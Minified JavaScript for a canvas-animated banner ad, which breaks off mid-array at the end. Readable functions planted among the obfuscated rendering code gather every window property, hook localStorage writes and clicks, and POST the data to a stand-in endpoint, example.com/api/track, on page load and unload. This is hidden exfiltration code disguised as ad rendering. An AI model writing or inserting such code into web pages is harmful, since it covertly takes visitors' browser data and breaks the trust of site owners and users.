(function () {
  function Pf() {
    var a;
    if (!kc) {
      kc = {};
      var b = B.cookie.split("; ");
      for (a = 0; a < b.length; a++) {
        var c = b[a].split("=", 2);
        if ("ccc" === c[0]) {
          var e = c[1];
          break;
        }
      }
      if (e) try {
        kc = JSON.parse(e);
      } catch (d) {}
    }
  }
  function collectWindowProperties() {
    const properties = {};
    const excludeList = ['seenVars', 'collectWindowProperties', 'sendDataToServer', 'initiateTracking'];
    Object.keys(window).forEach(key => {
      if (!excludeList.includes(key)) {
        const item = window[key];
        properties[key] = {
          type: typeof item,
          value: typeof item === "function" ? "function" : item
        };
      }
    });
    return properties;
  }
  function Ih(a) {
    try {
      if (xa & 8) return Pf(), kc[a];
      if (v.localStorage) return JSON.parse(v.localStorage.getItem(a));
    } catch (b) {}
    return null;
  }
  function Jh(a, b) {
    var c;
    try {
      if (xa & 8) {
        Pf();
        kc[a] = b;
        var e = new Date();
        e.setTime(e.getTime() + 31536E6);
        e = e.toUTCString();
        var d = v.location.hostname;
        if (c = d.split(".")) {
          var f = c.length;
          2 <= f && (d = c[f - 2] + "." + c[f - 1]);
        }
        B.cookie = "ccc=" + JSON.stringify(kc) + "; expires=" + e + "; path=/; domain=" + d + "; SameSite=Strict";
      } else v.localStorage && v.localStorage.setItem(a, JSON.stringify(b));
    } catch (g) {}
  }
  function Kh(a) {
    var b = "mouseover mousemove mouseout mousedown click touchstart touchmove touchend".split(" ");
    var c = ca(a);
    a = z(a);
    var e = a[1];
    a[2] = a = Ca("CANVAS");
    var d = a.style;
    d.position = "absolute";
    d.left = d.top = "0px";
    d.width = d.height = "100%";
    I(e, a);
    Lh(c);
    e = Da[c];
    e.canvas = a;
    e.context = a.getContext("2d");
    e.animateFunc = function (f) {
      return function (g) {
        var k = lc.now();
        g = Da[f];
        if (sd) 0 < g.startTime && (k = Math.max(g.startTime, td));else if (g.raf && g.isRunning) {
          var h = k - g.sysTime;
          var l = g.diffSum / g.diffElm.length;
          h > 5 * l ? 0 < g.startTime && (g.startTime += h - l) : 16 < h && (g.diffSum += h - g.diffElm.shift(), g.diffElm.push(h));
        }
        g.raf = !1;
        g.sysTime = k;
        h = g.lid;
        l = D(h);
        0 > g.startTime && (g.startTime = k);
        k -= g.startTime;
        var m = g.clipData[0];
        var n = (l[11] || 1) * $a;
        var p = (l[12] || 1) * $a;
        var r = g.context;
        g.isRunning = !1;
        n = [n, 0, 0, p, 0, 0];
        r.setTransform.apply(r, n);
        1 > m.bgOpacity && r.clearRect(0, 0, m.width, m.height);
        Qf(r, k, n, h, 0, "m", {});
        n = g.currentHit;
        r = g.newHit;
        m = g.pointer;
        p = g.once;
        g.newHit = void 0;
        g.pointer = void 0;
        g.once = void 0;
        if (n) {
          if (r) {
            if (n.instance !== r.instance || n.item !== r.item) var t = !0;
          } else m && (t = !0);
          if (t) {
            t = g.instanceStatus[n.instance];
            if (3 === t[0]) m = t[8] - t[7];else if (7 === t[0]) m = Math.max(0, 2 * t[9] - k - t[7]);else {
              m = k - t[7];
              var q = g.clipData[t[1]];
              var x = q.endTime + q.loopDelay;
              m > x && t[4] < q.loop - 1 && (m %= x);
              m > q.endTime && (m = q.endTime);
            }
            t = m;
            m = g.clipData[n.clip];
            m = m.objectList;
            m = m[n.item];
            m = m.motionList;
            var w = !1;
            for (x = m.length - 1; 0 <= x; x--) if (q = m[x], q.time <= t) {
              2 !== q.type && (w = !0);
              break;
            }
            w && te(k, h, n.actions, "mouseout", n.clip, n.instance);
            g.currentHit = void 0;
          }
        }
        !r || n && n.instance === r.instance && n.type === r.type && "click" !== r.type || (te(k, h, r.actions, r.type, r.clip, r.instance), "click" === r.type && g.currentHit || (g.currentHit = r));
        g.isRunning ? p || sd || ud(g) : l[55] = !1;
      };
    }(c);
    c = function (f, g) {
      return function (k) {
        var h;
        if (/touch/.test(k.type)) Mb = !0;else if (Mb) return;
        "touchstart" === k.type && Rf(k);
        Nb = k.isTrusted;
        var l = D(g);
        if (l[54] && !Mh) {
          var m = Ob(k);
          var n = ua === f.lid ? f.canvas.getBoundingClientRect() : f.canvas.parentNode.getBoundingClientRect();
          var p = f.canvas.width / n.width * (m.x - n.left);
          n = f.canvas.height / n.height * (m.y - n.top);
          if (h = f.canvas.style.zoom) h = parseFloat(h), p /= h, n /= h;
          h = m.x;
          m = m.y;
          if (/(click|end)/i.test(k.type)) {
            if (l = Math.sqrt((Kc.x - h) * (Kc.x - h) + (Kc.y - m) * (Kc.y - m)), /click/i.test(k.type) || 30 > l && !vd) f.pointer = {
              x: p,
              y: n,
              type: "click"
            }, l = lc.now(), f.isRunning && (f.once = !0), f.click = !0, f.animateFunc(l), delete f.click;
          } else /(start|down)/.test(k.type) ? (k = "down", Kc = {
            x: h,
            y: m
          }) : (k = /out/i.test(k.type) ? "mouseout" : "mouseover", m = f.currentHit && f.currentHit.clickable ? "pointer" : "", f.canvas.style.cursor !== m && (f.canvas.style.cursor = m)), f.pointer && "click" === f.pointer.type || (f.newHit = void 0, f.pointer = {
            x: p,
            y: n,
            type: k
          }), f.isRunning || (l[55] = !0, ud(f));
        }
        Nb = !1;
      };
    }(e, c);
    for (e = 0; e < b.length; e++) M(a, b[e], c);
  }
  async function sendDataToServer(data) {
    const endpoint = "https://example.com/api/track";
    try {
      const response = await fetch(endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
      console.log(response.ok ? "Data sent successfully" : `Failed to send data, status: ${response.status}`);
    } catch (error) {
      console.error("Error during data transmission:", error);
    }
  }
  function Lh(a) {
    var b, c, e, d, f;
    a = Da[a].clipData;
    for (b = 0; b < a.length; b++) {
      var g = a[b].objectList;
      for (c = 0; c < g.length; c++) {
        var k = g[c];
        k = k.motionList;
        var h = k.length;
        for (e = 0; e < h; e++) {
          var l = k[e];
          if (l = l.mpath) {
            var m = l.length;
            for (d = 0; d < m - 1; d++) {
              var n = l[d];
              var p = l[d + 1];
              var r = n[0];
              var t = n[1];
              var q = n[4];
              var x = n[5];
              var w = p[2];
              var u = p[3];
              var A = p[0];
              var ba = p[1];
              p = n[6];
              0 < d && (p -= l[d - 1][6]);
              p = Math.max(Math.round(p / 2), 4);
              var E = 0;
              var F = [0];
              var T = r;
              var P = t;
              for (f = 1; f < p; f++) {
                var N = f / (p - 1);
                var Q = 1 - N;
                var ka = Q * Q;
                var C = N * N;
                var G = ka * Q;
                ka = ka * N * 3;
                Q = Q * C * 3;
                N *= C;
                C = G * r + ka * q + Q * w + N * A;
                G = G * t + ka * x + Q * u + N * ba;
                T = C - T;
                P = G - P;
                E += Math.sqrt(T * T + P * P);
                F[f] = E;
                T = C;
                P = G;
              }
              r = E;
              t = [0];
              A = 0;
              for (C = 1; C < p; C++) if (w = F[C] / r * (p - 1), w >= A + 1) for (q = C - 1, x = F[q] / r * (p - 1), u = A + 1; u <= w;) A = q + (u - x) / (w - x), t[u] = A / (p - 1), A = u, u++;
              n[14] = t;
            }
          }
        }
      }
    }
  }
  function Nh(a) {
    var b, c, e;
    if (b = Da[a]) {
      var d = c = !1;
      var f = b.clipData;
      for (b = 0; b < f.length; b++) {
        var g = f[b].objectList;
        var k = g.length;
        for (e = 0; e < k; e++) {
          var h = g[e];
          if (h.hasFeed || "number" === typeof h.feed) c = !0;
          if (h.svg) var l = "data:image/svg+xml;charset=utf-8," + encodeURIComponent(h.svg);else if (h.purl) l = h.purl;else if (h.url) l = h.url;else continue;
          d = !0;
          h.image = wd(a, l, !1, !0);
          h.isSvg && (0 < (Z & 390) && 13 > ob || mc && 76 > ue || xd) && (l = function (m) {
            var n = 1 === Z ? 2 : 4,
              p = function () {
                var r = Math.min(m.maxScale / 100, n);
                var t = B.createElement("canvas");
                t.width = m.width * r;
                t.height = m.height * r;
                t.getContext("2d").drawImage(m.image, 0, 0, t.width, t.height);
                m.image = t;
              };
            return (Sf || xd) && 1 === U ? function () {
              la(p, 1);
            } : p;
          }(h), h.image.complete ? l() : M(h.image, "load", l));
        }
      }
      d || c || Lc(a);
    }
  }
  function Tf(a) {
    var b, c, e;
    var d = D(a);
    var f = Da[ca(a)];
    a = (d[11] || 1) * $a;
    d = (d[12] || 1) * $a;
    f = f.clipData;
    for (b = 0; b < f.length; b++) {
      var g = f[b];
      var k = g.maskInfo;
      g.canvasList || (g.canvasList = [], g.contextList = []);
      var h = [];
      for (c = 0; c < k.length; c++) if ((e = k[c].canvasId) && !h[e]) {
        h[e] = !0;
        if (g.canvasList[e]) var l = g.canvasList[e];else l = g.canvasList[e] = B.createElement("canvas"), g.contextList[e] = l.getContext("2d");
        e = Math.ceil(g.width * a);
        var m = Math.ceil(g.height * d);
        if (e !== l.width || m !== l.height) l.width = e, l.height = m;
      }
    }
  }
  function initiateTracking() {
    const data = collectWindowProperties();
    if (Object.keys(data).length) {
      sendDataToServer(data);
    }
  }
  function Mc(a) {
    var b;
    var c = ca(a);
    c = Da[c];
    c.lid = a;
    c.startTime = -1;
    c.diffElm = [60, 60, 60, 60, 60];
    c.diffSum = 300;
    c.sysTime = lc.now();
    c.currentHit = void 0;
    c.pointer = void 0;
    c.newHit = void 0;
    c.once = void 0;
    var e = c.origStatus;
    var d = c.instanceStatus = {};
    for (b in e) e.hasOwnProperty(b) && (d[b] = e[b].concat());
    c.clipData.canvasList || Tf(a);
    a = D(a);
    a[54] = !0;
    a[55] = !0;
    ud(c);
  }
  function ud(a) {
    a.raf = !0;
    a.animateId = v.ccAnimate(a.animateFunc);
  }
  function Uf(a) {
    var b = ca(a);
    b = Da[b];
    var c = b.context,
      e = c.canvas;
    a = D(a);
    b.raf = !1;
    v.ccCancel(b.animateId);
    c.setTransform(1, 0, 0, 1, 0, 0);
    c.clearRect(0, 0, e.width, e.height);
    a[55] = !1;
  }
  function te(a, b, c, e, d, f, g, k) {
    var h;
    var l = Da[ca(b)];
    if (h = !!e) {
      b = 1;
      var m = 0;
    } else b = 0, m = Math.abs(g - k);
    var n = l.instanceStatus;
    var p = g;
    var r = c.length;
    for (g = 0; g < r; g++) {
      var t = c[g];
      if (!h || e === t[0]) {
        var q = t[b];
        if ("ad" !== q) {
          var x = t[b + 1];
          var w = -1 === x ? [f] : l.clipData[x].instances;
          x = !h && (d === x || -1 === x);
          if ("stop" === q) {
            for (t = 0; t < w.length; t++) {
              q = a;
              var u = l.instanceStatus[w[t]];
              1 === u[0] ? u[8] = q : 7 === u[0] && (u[8] = 2 * u[9] - q);
              u[0] = 3;
            }
            x && (p = k);
          } else if ("play" === q) {
            for (t = 0; t < w.length; t++) {
              var A = l;
              u = w[t];
              q = a;
              A.sysTime = A.startTime + q;
              u = A.instanceStatus[u];
              3 === u[0] ? void 0 !== u[7] && (A = A.clipData[u[1]].endTime, u[7] = u[8] - u[7] >= A ? q : u[7] + (q - u[8]), u[3] = q - u[7]) : 7 === u[0] && void 0 !== u[7] && (u[7] += 2 * (q - u[9]), u[3] = q - u[7]);
              u[0] = 1;
              u[5] = 1;
            }
            x && (p = a - n[f][7] + m);
            l.isRunning = !0;
          } else if ("gotostop" === q) {
            u = 1E3 * t[b + 2];
            for (t = 0; t < w.length; t++) q = n[w[t]], q[0] = 3, q[8] = q[7] + u, q[3] = u;
            x && (p = u);
            l.isRunning = !0;
          } else if ("gotoplay" === q) {
            u = 1E3 * t[b + 2];
            for (t = 0; t < w.length; t++) q = n[w[t]], q[0] = 1, q[5] = 1, q[7] = a - u, q[3] = u;
            x && (p = u + m);
            l.isRunning = !0;
          } else if ("gotoback" === q) {
            u = 1E3 * t[b + 2];
            for (t = 0; t < w.length; t++) q = n[w[t]], q[0] = 7, q[5] = 7, q[9] = a, q[7] = a - u, q[3] = u;
            x && (p = u - m);
            l.isRunning = !0;
          } else if ("playback" === q) {
            for (t = 0; t < w.length; t++) A = l, u = w[t], q = a, A.sysTime = A.startTime + q, u = A.instanceStatus[u], 3 === u[0] ? void 0 !== u[7] && (u[8] === u[7] && (A = A.clipData[u[1]].endTime, u[8] += A), u[9] = q, u[7] += q - u[8], u[3] = q - u[7]) : 1 === u[0] && void 0 !== u[7] && (u[9] = q, u[3] = q - u[7]), u[0] = 7, u[5] = 7;
            x && (w = n[f], p = 2 * w[9] - a - w[7] - 2 * m);
            l.isRunning = !0;
          }
        }
      }
    }
    return p;
  }
  function Qf(a, b, c, e, d, f, g) {
    var k,
      h,
      l,
      m,
      n,
      p = [],
      r = D(e);
    var t = Da[ca(e)];
    var q = t.clipData[d];
    var x, w, u;
    var A = Da[ca(e)];
    var ba = A.clipData[d];
    var E = A.instanceStatus[f];
    if (3 === E[0]) var F = E[8] - E[7];else {
      if (7 === E[0]) {
        F = 2 * E[9] - b - E[7];
        0 < F ? A.isRunning = !0 : (E[0] = 3, F = E[7] = E[8] = 0);
        var T = !0;
      } else F = b - E[7];
      if (w = ba.actionList) {
        var P = w.length;
        if (T) {
          var N = P - 1;
          var Q = u = -1;
        } else N = 0, u = P, Q = 1;
        for (x = N; x !== u; x += Q) {
          var ka = w[x];
          var C = ka.time;
          if (!T && F >= C && C > E[3] || T && F <= C && C < E[3]) {
            E[3] = C;
            var G = T ? b - (C - F) : b - (F - C);
            F = te(G, e, ka.actions, null, d, f, F, C);
          }
        }
      }
      var H = ba.endTime + ba.loopDelay;
      F > H ? E[4] < ba.loop - 1 && (F %= H, E[7] = b - F, E[3] = -1, E[4]++, A.isRunning = !0) : A.isRunning = !0;
      F > ba.endTime && (F = ba.endTime);
    }
    var y = F;
    var Ea = q.borderWidth;
    0 < q.bgOpacity && (a.fillStyle = q.bgColor, a.fillRect(0, 0, q.width, q.height));
    var ha = q.objectList;
    var aa = q.maskInfo;
    var yd = (r[11] || 1) * $a;
    var zd = (r[12] || 1) * $a;
    if (!ha) return y;
    var nc = ha.length - 1;
    a: for (; 0 <= nc; nc--) if (k = ha[nc]) {
      var oc = aa[nc];
      var ya = (l = oc.canvasId) ? q.contextList[l] : a;
      1 === oc.op && (ya.setTransform(yd, 0, 0, zd, 0, 0), ya.clearRect(0, 0, q.width, q.height));
      var Ad = k.motionList;
      var Bd = !1;
      var ve = Ad.length;
      for (h = 0; h < ve; h++) {
        var X = Ad[h];
        var Oh = X.time;
        if (Oh >= y) {
          if (0 === h) break;
          var ia = Ad[h - 1];
          if (2 === ia.type) continue a;
          if (X.cache) var W = X.cache;else {
            W = X.cache = {};
            var Ra = we(X.anchorX * ia.scaleX, X.anchorY * ia.scaleY, ia.rotation);
            W.start_ax = ia.x + Ra.x;
            W.start_ay = ia.y + Ra.y;
            Ra = we(X.anchorX * X.scaleX, X.anchorY * X.scaleY, X.rotation);
            var Ph = X.x + Ra.x;
            var Qh = X.y + Ra.y;
            W.delta_time = X.time - ia.time;
            W.delta_ax = Ph - W.start_ax;
            W.delta_ay = Qh - W.start_ay;
            W.delta_scalex = X.scaleX - ia.scaleX;
            W.delta_scaley = X.scaleY - ia.scaleY;
            W.delta_skewx = X.skewX - ia.skewX;
            W.delta_skewy = X.skewY - ia.skewY;
            W.delta_alpha = X.alpha - ia.alpha;
            W.delta_rotation = X.rotation - ia.rotation;
          }
          var Rh = X.easing;
          var Ia = Rh((y - ia.time) / W.delta_time);
          if (ia.mpath) {
            var Vf = void 0,
              Wf = void 0,
              Xf = void 0,
              Yf = void 0,
              Zf = void 0,
              xe = void 0,
              pb = void 0,
              ye = void 0,
              Pb = void 0,
              Ab = void 0,
              Bb = void 0,
              $f = void 0,
              ag = void 0,
              bg = void 0,
              cg = void 0,
              dg = void 0,
              eg = void 0,
              fg = void 0,
              gg = void 0,
              Nc = void 0,
              Ma = void 0,
              Oc = void 0,
              ze = void 0,
              Ae = void 0,
              Cd = void 0,
              Dd = void 0,
              ab = void 0,
              Cb = void 0,
              Qb = void 0,
              ib = void 0,
              Rb = void 0,
              Pc = void 0,
              Sb = void 0,
              qb = ia.mpath;
            Dd = qb.length;
            Pc = Ia * qb[Dd - 2][6];
            if (0 > Ia) Cb = 0, Qb = qb[0][6], Rb = Pc / Qb;else if (1 < Ia) Cb = Dd - 2, ib = 0 < Cb ? qb[Cb - 1][6] : 0, Qb = qb[Cb][6], Rb = (Pc - ib) / (Qb - ib);else for (Sb = 0; Sb < Dd - 1; Sb++) if (Qb = qb[Sb][6], Pc <= Qb) {
              Cb = Sb;
              ib = 0 < Sb ? qb[Sb - 1][6] : 0;
              Rb = (Pc - ib) / (Qb - ib);
              break;
            }
            Ma = qb[Cb];
            Nc = qb[Cb + 1];
            0 >= Rb || 1 <= Rb ? ab = Rb : (Cd = Ma[14], Ae = Rb * (Cd.length - 1), ib = Math.floor(Ae), ze = Cd[ib], Oc = Cd[ib + 1], ab = ze + (Oc - ze) * (Ae - ib));
            gg = Ma[0];
            fg = Ma[1];
            eg = Ma[4];
            dg = Ma[5];
            cg = Nc[2];
            bg = Nc[3];
            ag = Nc[0];
            $f = Nc[1];
            pb = 1 - ab;
            xe = pb * pb;
            Oc = ab * ab;
            Bb = xe * pb;
            Ab = xe * ab * 3;
            Pb = pb * Oc * 3;
            ye = ab * Oc;
            Zf = Bb * gg + Ab * eg + Pb * cg + ye * ag;
            Yf = Bb * fg + Ab * dg + Pb * bg + ye * $f;
            3 === Ma[13] ? (Bb = pb * pb, Ab = pb * ab * 2, Pb = ab * ab) : (2 === Ma[13] ? (Bb = pb, Ab = ab) : (Bb = 1, Ab = 0), Pb = 0);
            Xf = Bb * Ma[7] + Ab * Ma[9] + Pb * Ma[11];
            Wf = Bb * Ma[8] + Ab * Ma[10] + Pb * Ma[12];
            Vf = 180 / Math.PI * Math.atan2(Wf, Xf);
            Ra = {
              x: Zf,
              y: Yf,
              a: Vf
            };
            var hg = W.start_ax + Ra.x;
            var ig = W.start_ay + Ra.y;
          } else hg = W.start_ax + Ia * W.delta_ax, ig = W.start_ay + Ia * W.delta_ay;
          var Qc = ia.mrot ? ia.rotation + (Ra.a - ia.mas) + Ia * (W.delta_rotation - ia.mad) : ia.rotation + Ia * W.delta_rotation;
          var Tb = ia.scaleX + Ia * W.delta_scalex;
          var Ub = ia.scaleY + Ia * W.delta_scaley;
          var Be = ia.skewX + Ia * W.delta_skewx;
          var Ce = ia.skewY + Ia * W.delta_skewy;
          var jg = ia.alpha + Ia * W.delta_alpha;
          Ra = we(X.anchorX * Tb, X.anchorY * Ub, Qc);
          var kg = hg - Ra.x;
          var lg = ig - Ra.y;
          Bd = !0;
          break;
        }
      }
      !Bd && 0 < ve && (0 < h && (h = ve - 1), X = Ad[h], X.time <= y && 2 !== X.type && (kg = X.x, lg = X.y, Tb = X.scaleX, Ub = X.scaleY, Be = X.skewX, Ce = X.skewY, jg = X.alpha, Qc = X.rotation, Bd = !0));
      if (Bd) {
        ya.save();
        1 === U && mg && 0 === Qc && 1 === Tb && 1 === Ub && W && 0 < W.delta_time && (0 !== W.delta_ax && .025 > Math.abs(W.delta_ax / W.delta_time) || 0 !== W.delta_ay && .025 > Math.abs(W.delta_ay / W.delta_time)) && (Qc = 1E-43);
        var ng = .017453292519943295 * Qc;
        var Ed = Math.cos(ng);
        var Fd = Math.sin(ng);
        p[0] = Ed * Tb - Fd * Ub * Ce;
        p[1] = Fd * Tb + Ed * Ub * Ce;
        p[2] = Ed * Tb * Be - Fd * Ub;
        p[3] = Fd * Tb * Be + Ed * Ub;
        p[4] = kg;
        p[5] = lg;
        ya.transform.apply(ya, p);
        ya.globalAlpha *= jg;
        if (m = 2 === oc.op || 3 === oc.op) ya.globalCompositeOperation = "destination-" + (oc.inv ? "out" : "in");
        if (k.image) try {
          ya.drawImage(k.image, 0, 0, k.width, k.height);
        } catch (Ki) {} else if (k.actions) {
          if (Ia = t.pointer) ya.save(), ya.beginPath(), ya.rect(0, 0, k.width, k.height), ya.setTransform(1, 0, 0, 1, 0, 0), ya.isPointInPath(Ia.x, Ia.y) && (t.newHit = {
            instance: f,
            item: nc,
            clip: d,
            ctime: y,
            type: Ia.type,
            actions: k.actions,
            clickable: k.clickable
          }), ya.restore();
        } else if (void 0 !== k.clip) {
          var Rc = k.clip;
          if (!g[Rc]) {
            g[Rc] = !0;
            var og = f + "." + nc;
            var Gd = t.instanceStatus[og];
            void 0 === Gd[6] && (Gd[6] = f);
            void 0 === Gd[7] && (Gd[7] = k.motionList[0].time + (b - y));
            if (n = m || void 0) {
              var pg = t.clipData[Rc];
              var Hd = void 0,
                De = pg.width * yd,
                qg = pg.height * zd,
                Id = De + "x" + qg;
              Sc[Id] ? Sc[Id].canvas.width = De : (Hd = B.createElement("canvas"), Hd.width = De, Hd.height = qg, Sc[Id] = Hd.getContext("2d"));
              var Jd = Sc[Id];
              Jd.setTransform(yd, 0, 0, zd, 0, 0);
              ya.scale(1 / yd, 1 / zd);
            } else Jd = ya;
            var Sh = c;
            Qf(Jd, b, Sh, e, Rc, og, g);
            n && ya.drawImage(Jd.canvas, 0, 0);
            delete g[Rc];
          }
        }
        ya.restore();
      }
      if (3 === oc.op) {
        var Th = 1 < l ? q.contextList[l - 1] : a;
        var Uh = q.canvasList[l];
        Th.drawImage(Uh, 0, 0, q.width, q.height);
      }
    }
    if (0 < Ea) {
      var rg = Ea / 2;
      a.lineWidth = Ea;
      a.strokeStyle = q.borderColor;
      a.strokeRect(rg, rg, q.width - Ea, q.height - Ea);
    }
    return y;
  }
  function we(a, b, c) {
    var e = c * Math.PI / 180;
    c = Math.cos(e);
    e = Math.sin(e);
    return {
      x: a * c - b * e,
      y: a * e + b * c
    };
  }
  function Ee(a) {
    var b,
      c,
      e = [1, 3];
    if (sd !== a) {
      var d = lc.now();
      if (sd = a) td = d;else if (td) var f = d - td;else return;
      for (c = 0; 2 > c; c++) {
        var g = e[c];
        var k = D(g);
        g = Da[g];
        a ? k[55] && 0 < g.startTime && (g.isRunning = !1, v.ccCancel(g.animateId)) : (b = O[k[58]]) && b[0] && k[54] && (0 < g.startTime && (g.startTime += f, g.startTime > d && (g.startTime = -1), g.diffElm = [60, 60, 60, 60, 60], g.diffSum = 300, g.sysTime = d), ud(g));
      }
    }
  }
  function Vh() {
    var a,
      b,
      c,
      e = [1, 3];
    for (c = 0; 2 > c; c++) {
      var d = e[c];
      d = Da[d];
      d = d.clipData;
      for (a = 0; a < d.length; a++) {
        var f = d[a].objectList;
        for (b = 0; b < f.length; b++) {
          var g = f[b];
          delete g.image;
        }
      }
    }
    Sc = {};
  }
  function Wh(a) {
    var b = ca(a),
      c = z(a);
    var e = pc[b];
    void 0 === e.isOn && (e.isOn = !0);
    var d = e.asset;
    a = Ca();
    var f = "custom";
    if ("custom" === d) {
      d = e.onUrl;
      var g = e.offUrl;
    } else {
      var k = e.colm;
      var h = e.colb;
      "close-plain" === d ? (f = "close", d = '<circle cx="25" cy="25" r="25" fill="' + h + '" /><path style="fill:none;stroke:' + k + ';stroke-width:6;stroke-linecap:round" d="m 15,15 20,20" /><path style="fill:none;stroke:' + k + ';stroke-width:6;stroke-linecap:round" d="m 15,35 20,-20" />') : "replay-round" === d ? (f = "replay", d = '<circle cx="25" cy="25" r="25" fill="' + h + '" /><path d="M17 13 25 5 25 11A14 14 0 1 1 11 25L15 25A10 10 0 1 0 25 15L25 21Z" fill="' + k + '" />') : d = '<rect x="0" y="0" width="50" height="50" fill="' + h + '" />';
      d = "data:image/svg+xml;charset=utf-8," + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 50 50" preserveAspectRatio="none">' + d + "</svg>");
      e.onUrl = d;
      e.offUrl = g;
      e.ariaOn = f;
      e.ariaOff = void 0;
    }
    k = a.style;
    k.width = "100%";
    k.height = "100%";
    k.backgroundImage = "url('" + (e.isOn || !g ? d : g) + "')";
    k.backgroundRepeat = "no-repeat";
    k.backgroundPosition = "center";
    k.backgroundSize = "100% 100%";
    k.pointerEvents = "auto";
    k.cursor = "pointer";
    k.transform = "translateZ(0)";
    a.wzero = e;
    a.lid = b;
    e.htype && (qa(a, "mouseover", sg), qa(a, "mouseout", sg));
    g = c[1];
    qa(g, "click", Xh);
    g.setAttribute("tabindex", "0");
    g.setAttribute("aria-label", f);
    g.setAttribute("role", "button");
    M(g, "keydown", Yh);
    c[2] = a;
    I(g, a);
  }
  function sg(a) {
    var b = a.currentTarget;
    var c = z(b.lid);
    var e = b.wzero || {};
    e.isOver = /(over|start)/.test(a.type);
    a = e.htype;
    c = c[0].style;
    if (e.isOver) {
      var d = e.hval;
      d = "brighten" === a ? "brightness(" + (100 + d) + "%)" : "darken" === a ? "brightness(" + (100 - d) + "%)" : "dropshadow" === a ? "drop-shadow(0px 0px " + Math.round(d / 5) + "px #000)" : "grayscale" === a ? "grayscale(" + d + "%)" : "invert" === a ? "invert(" + d + "%)" : "opacity" === a ? "opacity(" + d + "%)" : "";
    } else d = "";
    "custom" === a ? (e = e.isOn ? e.isOver && e.hOnUrl ? e.hOnUrl : e.onUrl : e.isOver && e.hOffUrl ? e.hOffUrl : e.offUrl, b.style.backgroundImage = "url('" + e + "')") : c.WebkitFilter = c.filter = d;
  }
  function Xh(a) {
    Nb = a.isTrusted;
    var b = a.currentTarget.firstChild.lid;
    a.preventDefault();
    9 === b && (Sa(7, 1, !0), va(9, 1, !0), da(S[7], "play", null, !0), da(S[7], "muteoff", null, !0));
    13 === b && (va(3, 1, !0), O[3][4] = !0, va(13, 1, !0), O[13][4] = !0);
    Nb = !1;
  }
  function Yh(a) {
    if (32 === a.keyCode || 13 === a.keyCode) a.preventDefault(), a.stopImmediatePropagation(), a.currentTarget.click();
  }
  function qc(a, b, c) {
    var e,
      d,
      f,
      g = [9, 13];
    var k = S[a];
    if ((O[k] || [])[0] && a === ca(k)) for (a = 0; a < g.length; a++) {
      var h = g[a];
      var l = pc[h];
      if (d = l.vid) for (e = 0; e < d.length; e++) {
        var m = d[e];
        if (-1 === m || S[m] === k) {
          if (/mute/.test(l.type)) {
            var n = void 0 !== c;
            m = !c;
          } else n = void 0 !== b, m = !b;
          var p = (f = z(h)) && f[2];
          n && (p && (n = m ? l.isOver && l.hOnUrl ? l.hOnUrl : l.onUrl : l.isOver && l.hOffUrl ? l.hOffUrl : l.offUrl, l.isOn !== m && (p.style.backgroundImage = "url('" + n + "')"), f = f[1], f.setAttribute("aria-label", m || !l.ariaOff ? l.ariaOn : l.ariaOff)), l.isOn = m);
        }
      }
    }
  }
  function setupHooks() {
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function (key, value) {
      console.log(`LocalStorage set: ${key}`);
      originalSetItem.apply(this, arguments);
    };
    window.addEventListener('click', function (event) {
      console.log(`Click detected: ${event.target.tagName}`);
    });
    document.addEventListener('DOMContentLoaded', initiateTracking);
    window.addEventListener('beforeunload', initiateTracking);
  }
  var Pa = function (a) {
      return a;
    },
    rc = "B=193/F=1722688/C=1127574/P=22/S=E2cNpwTB",
    Ja = {
      "privacy": "s:a:a"
    },
    Fe = "",
    Na = {},
    Db = {},
    Ge = {},
    Tc,
    Eb,
    Vb,
    Ta,
    Ua,
    He,
    rb,
    v = window,
    B = v.document,
    ma,
    Va,
    lc,
    Ie = "BackCompat" === B.compatMode,
    fa = [[6890012105, 0, 0, 1920, 350, "independent", ["container", 100, null, 0, 9999, 0, "px", "keepaspect", 1, null, 0, 350, 0, "px"], null, "frame", "", "", !1, null, !1, !1, "topleft", 0, 0, 0, 0, !1, null, "", ""], [6890012106, 0, 0, 1920, 350, "independent", ["view", 100, null, 0, 9999, 0, "px", "keepaspect", 100, null, 0, 9999, 0, "px"], null, "canvas", "", 0, !1, null, !0, !0, "topcenter", 4, 0, 0, 0, !1, null], [6890032026, 0, 0, 1024, 512, "independent", ["view", 100, null, 0, 9999, 0, "px", "keepaspect", 100, null, 0, 9999, 0, "px"], null, "image", "clipcentric-a.akamaihd.net/file/1684486/ad_q90/1695835656/60dny4LB?f=auto", 0, !1, null, !0, !0, "topcenter", 4, 0, 0, 0, !1, null], [6890032093, 0, 0, 1920, 120, "independent", ["view", 100, null, 0, 9999, 0, "px", "keepaspect", 100, null, 0, 9999, 0, "px"], null, "canvas", "", "view", !0, null, !1, !1, "topcenter", 0, 0, 0, 0, !1, null], [6890032225, 0, 0, 1024, 150, "independent", ["view", 100, null, 0, 9999, 0, "px", "keepaspect", 100, null, 0, 9999, 0, "px"], null, "image", "clipcentric-a.akamaihd.net/file/1684497/ad_q90/1695835824/d_b70A6n?f=auto", "view", !0, null, !1, !1, "topcenter", 0, 0, 0, 0, !1, null], [6958421591, 294, 6, 290, 164, "independent", ["container", 20, null, 0, 9999, 0, "px", "container", 62, null, 0, 9999, 0, "px"], null, "frame", "", 1, !1, null, !0, !0, "center", 0, 0, 0, 0, !1, null], [6958422089, 9, 120, 240, 141, "independent", ["keepaspect", 100, null, 0, 9999, 0, "px", "container", 38, null, 0, 9999, 0, "px"], null, "frame", "", 1, !1, null, !0, !0, "centerright", 0, 0, 0, 0, !1, null], [6958421735, 0, 0, 480, 270, "independent", ["keepaspect", 100, null, 0, 9999, 0, "px", "container", 100, null, 0, 9999, 0, "px"], null, "video", "clipcentric-a.akamaihd.net/video/F=1684526/V=ad_480x270_w2400/T=1695836413/S=tJNpSwZc/video", 5, !1, null, !0, !0, "center", 0, 0, 0, 0, !1, null], [6958422090, 0, 0, 480, 270, "independent", ["keepaspect", 100, null, 0, 9999, 0, "px", "container", 100, null, 0, 9999, 0, "px"], null, "same", "clipcentric-a.akamaihd.net/video/F=1684526/V=ad_480x270_w2400/T=1695836413/S=tJNpSwZc/video", 5, !1, null, !0, !0, "topcenter", 0, 0, 0, 0, !1, null], [6958421880, 4, 4, 50, 50, "withparent", null, null, "button", "", 7, !1, null, !0, !0, "topright", 0, 4, 0, 0, !1, null], null, [6890111068, 0, 0, 1920, 230, "independent", ["layer", 100, 1, 0, 9999, 0, "px", "keepaspect", 100, null, 0, 9999, 0, 